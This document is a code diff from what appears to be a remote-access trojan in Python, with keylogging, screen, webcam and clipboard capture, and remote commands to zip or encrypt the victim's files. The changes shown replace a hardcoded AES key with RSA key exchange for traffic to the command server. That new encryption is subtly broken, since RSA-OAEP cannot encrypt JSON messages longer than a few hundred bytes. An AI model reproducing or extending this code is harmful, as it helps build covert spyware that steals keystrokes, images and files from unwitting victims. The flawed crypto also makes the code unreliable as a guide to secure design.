@@ -15,7 +15,12 @@ import mss
 import cv2
 import pynput
 import clipboard
-from  cryptography.exceptions import InvalidTag
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.exceptions import InvalidTag
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 
@@ -38,7 +43,7 @@ class Client:
                 self.connection.send(self.response)
             elif request["cmd"] == "z":
                 process = multiprocessing.Process(target=self.zip_file_or_folder, args=(
-                                    self.response, request["comp_lvl"], request["open_path"], request["save_path"],))
+                    self.response, request["comp_lvl"], request["open_path"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.response)
             elif request["cmd"] == "w":
@@ -68,7 +73,7 @@ class Client:
                 self.connection.send(self.response)
             elif request["cmd"] == "e":
                 process = multiprocessing.Process(target=self.crypt, args=(
-                                        self.response, request["action"], request["open_path"], request["password"],))
+                    self.response, request["action"], request["open_path"], request["password"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.response)
 
@@ -224,9 +229,12 @@ class Connection:
 
         HOST = "127.0.0.1"
         PORT = 10001
-        KEY = b'\xbch`9\xd6k\xcbT\xed\xa5\xef_\x9d*\xda\xd2sER\xedA\xc0a\x1b)\xcc9\xb2\xe7\x91\xc2A'
 
-        self.crypter = AESGCM(KEY)
+        self.privkey = rsa.generate_private_key(public_exponent=65537,
+                                                key_size=2048,
+                                                backend=default_backend())
+        self.pubkey_pem = self.privkey.public_key().public_bytes(encoding=serialization.Encoding.PEM,
+                                                                 format=serialization.PublicFormat.SubjectPublicKeyInfo)
 
         if len(sys.argv) == 3:
             try:
@@ -245,6 +253,17 @@ class Connection:
             except socket.error:
                 time.sleep(30)
 
+        self.server_pub = self.exchange_keys()
+
+    def pem_to_key(self, pem):
+        return serialization.load_pem_public_key(pem, backend=default_backend())
+
+    def exchange_keys(self):
+        self.sock.sendall(self.pubkey_pem)
+        pem = self.sock.recv(self.PACKET_SIZE) + self.sock.recv(self.PACKET_SIZE)
+        pubkey = serialization.load_pem_public_key(pem, default_backend())
+        return pubkey
+
     def send(self, data: dict):
         data = self.encrypt(json.dumps(data.copy()).encode(self.CODEC))
         self.sock.sendall(str(len(data)).encode("utf8"))
@@ -260,11 +279,16 @@ class Connection:
         return json.loads(self.decrypt(bytes(data)).decode(self.CODEC))
 
     def encrypt(self, data):
-        nonce = os.urandom(12)
-        return nonce + self.crypter.encrypt(nonce, data, b"")
+        return self.server_pub.encrypt(data,
+                                       padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                                                    algorithm=hashes.SHA256(),
+                                                    label=None))
 
     def decrypt(self, cipher):
-        return self.crypter.decrypt(cipher[:12], cipher[12:], b"")
+        return self.privkey.decrypt(cipher,
+                                    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                                                 algorithm=hashes.SHA256(),
+                                                 label=None))
 
 
 class Keylogger:
